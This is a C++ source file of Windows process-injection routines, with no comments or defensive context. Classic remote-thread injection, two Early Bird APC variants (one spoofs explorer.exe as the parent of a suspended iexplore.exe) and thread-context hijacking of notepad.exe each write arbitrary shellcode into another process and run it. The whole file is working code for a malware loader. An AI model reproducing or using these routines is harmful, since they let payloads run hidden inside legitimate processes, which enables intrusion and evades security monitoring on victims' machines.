#include "pch.h"

DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof pe;

    if (Process32First(hSnapshot, &pe))
    {
        do {
            if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
            {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

BOOL ClassicInjection(LPVOID lpAddress, DWORD dwSize) {
    DWORD ProcessId = GetProcessIdByName(L"notepad.exe");
    if (NULL != ProcessId)
    {
        printf("[+] ClassicInjection->FindProcess->%d\n", ProcessId);
    }
    else
    {
        printf("[-] ClassicInjection->FindProcess->false\n");
        return FALSE;
    }
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessId);
    if (NULL != hProcess)
    {
        printf("[+] ClassicInjection->OpenProcess->%d\n", hProcess);
    }
    else
    {
        printf("[-] ClassicInjection->OpenProcess->false\n");
        return FALSE;
    }
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress)
    {
        printf("[+] ClassicInjection->VirtualAllocEx->%X\n", lpBaseAddress);
    }
    else
    {
        CloseHandle(hProcess);
        printf("[-] ClassicInjection->VirtualAllocEx->false\n");
        return FALSE;
    }
    if (WriteProcessMemory(hProcess, lpBaseAddress, lpAddress, dwSize + 1, NULL))
    {

        printf("[+] ClassicInjection->WriteProcessMemory->%X\n", lpBaseAddress);
    }
    else
    {
        CloseHandle(hProcess);
        printf("[-] ClassicInjection->WriteProcessMemory->false\n");
        return FALSE;
    }
    HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
    if (hThread)
    {
        printf("[+] ClassicInjection->CreateRemoteThread->%X\n", hThread);
    }
    else
    {
        CloseHandle(hProcess);
        printf("[-] ClassicInjection->CreateRemoteThread->false\n");
        return FALSE;
    }
    printf("[+] ClassicInjection->Success\n");
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

BOOL EarlyBird2(LPVOID lpAddress, DWORD dwSize) {
    HANDLE hThread = NULL;
    HANDLE hProcess = 0;
    DWORD ProcessId = 0;
    LPVOID AllocAddr = NULL;

    ProcessId = GetProcessIdByName(L"notepad.exe");
    if (NULL != ProcessId)
    {
        printf("[+] EarlyBird2->FindProcess->%d\n", ProcessId);
    }
    else
    {
        printf("[-] EarlyBird2->FindProcess->false\n");
        return FALSE;
    }
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessId);
    if (NULL != hProcess)
    {
        printf("[+] EarlyBird2->OpenProcess->%d\n", hProcess);
    }
    else
    {
        printf("[-] EarlyBird2->OpenProcess->false\n");
        return FALSE;
    }

    AllocAddr = VirtualAllocEx(hProcess, 0, dwSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    if (AllocAddr)
    {
        printf("[+] EarlyBird2->VirtualAllocEx->%X\n", AllocAddr);
    }
    else
    {
        CloseHandle(hProcess);
        printf("[-] EarlyBird2->VirtualAllocEx->false\n");
        return FALSE;
    }
   

    if (WriteProcessMemory(hProcess, AllocAddr, lpAddress, dwSize + 1, 0))
    {
        printf("[+] EarlyBird2->WriteProcessMemory->%X\n", AllocAddr);
    }
    else
    {
        CloseHandle(hProcess);
        printf("[-] EarlyBird2->WriteProcessMemory->false\n");
        return FALSE;
    }
    hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);
    if (hThread)
    {
        printf("[+] EarlyBird2->CreateRemoteThread->%X\n", hThread);
    }
    else
    {
        CloseHandle(hProcess);
        printf("[-] EarlyBird2->CreateRemoteThread->false\n");
        return FALSE;
    }

    if (QueueUserAPC((PAPCFUNC)AllocAddr, hThread, 0))
    {
        printf("[+] EarlyBird->QueueUserAPC->true\n");
    }
    else
    {
        CloseHandle(hProcess);
        printf("[-] EarlyBird->QueueUserAPC->false\n");
        return FALSE;
    }
    ResumeThread(hThread);
    //WaitForSingleObject(hThread, INFINITE);
    printf("[+] EarlyBird2->Success\n");
    CloseHandle(hProcess);
    CloseHandle(hThread);
    return TRUE;
}

BOOL EarlyBird(LPVOID lpAddress,DWORD dwSize) {
    DWORD ProcessId = 0;

    ProcessId = GetProcessIdByName(L"explorer.exe");
    if (NULL != ProcessId)
    {
        printf("[+] EarlyBird->FindProcess->%d\n", ProcessId);
    }
    else
    {
        printf("[-] EarlyBird->FindProcess->false\n");
        return FALSE;
    }

    STARTUPINFOEXA siex = { 0 };
    PROCESS_INFORMATION piex = { 0 };
    SIZE_T sizeT;
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessId);

    if (NULL != expHandle)
    {
        printf("[+] EarlyBird->OpenProcess->%d\n", expHandle);
    }
    else
    {
        printf("[-] EarlyBird->OpenProcess->false\n");
        return FALSE;
    }

    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &sizeT);
    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);


    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&siex, &piex);
    if (NULL != piex.dwProcessId)
    {
        printf("[+] EarlyBird->CreateProcessA->%d\n", piex.dwProcessId);
    }
    else
    {
        CloseHandle(expHandle);
        printf("[-] EarlyBird->CreateProcessA->false\n");
        return FALSE;
    }


    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(piex.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (WriteProcessMemory(piex.hProcess, lpBaseAddress, (LPVOID)lpAddress, dwSize, NULL))
    {
        printf("[+] EarlyBird->WriteProcessMemory->%X\n", lpBaseAddress);
    }
    else
    {
        CloseHandle(expHandle);
        CloseHandle(piex.hThread);
        printf("[-] EarlyBird->WriteProcessMemory->false\n");
        return FALSE;
    }
    
    
    if (QueueUserAPC((PAPCFUNC)lpBaseAddress, piex.hThread, NULL))
    {
        printf("[+] EarlyBird->QueueUserAPC->true\n");
    }
    else
    {
        CloseHandle(expHandle);
        CloseHandle(piex.hThread);
        printf("[-] EarlyBird->QueueUserAPC->false\n");
        return FALSE;
    }

    ResumeThread(piex.hThread);
    printf("[+] EarlyBird->Success\n");
    CloseHandle(expHandle);
    CloseHandle(piex.hThread);

    return TRUE;
}

BOOL ThreadHijack(LPVOID lpAddress, DWORD dwSize) {
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);

    PROCESS_INFORMATION pi = { 0 };

    
    if (CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        printf("[+] ThreadHijack->CreateProcessA->true\n");
    }
    else
    {
        printf("[-] ThreadHijack->CreateProcessA->false\n");
        return FALSE;
    }
    
    LPVOID lpBuffer = VirtualAllocEx(pi.hProcess, NULL, dwSize+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpBuffer)
    {
        printf("[+] ThreadHijack->VirtualAllocEx->%X\n", lpBuffer);
    }
    else
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        printf("[-] ThreadHijack->VirtualAllocEx->false\n");
        return FALSE;
    }
    
    if (WriteProcessMemory(pi.hProcess, lpBuffer, lpAddress, dwSize + 1, NULL))
    {
        printf("[+] ThreadHijack->WriteProcessMemory->%X\n", lpBuffer);
    }
    else
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        printf("[-] ThreadHijack->WriteProcessMemory->false\n");
        return FALSE;
    }
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
   
    if (GetThreadContext(pi.hThread, &ctx))
    {
        printf("[+] ThreadHijack->GetThreadContext->true\n");
    }
    else
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        printf("[-] ThreadHijack->GetThreadContext->false\n");
        return FALSE;
    }

#if _WIN64
    ctx.Rip = (DWORD64)lpBuffer;
#else
    ctx.Eip = (DWORD32)lpBuffer;
#endif // _WIN64

    if (SetThreadContext(pi.hThread, &ctx))
    {
        printf("[+] ThreadHijack->SetThreadContext->true\n");
    }
    else
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        printf("[-] ThreadHijack->SetThreadContext->false\n");
        return FALSE;
    }
    ResumeThread(pi.hThread);
    printf("[+] ThreadHijack->Success\n");
    return TRUE;
}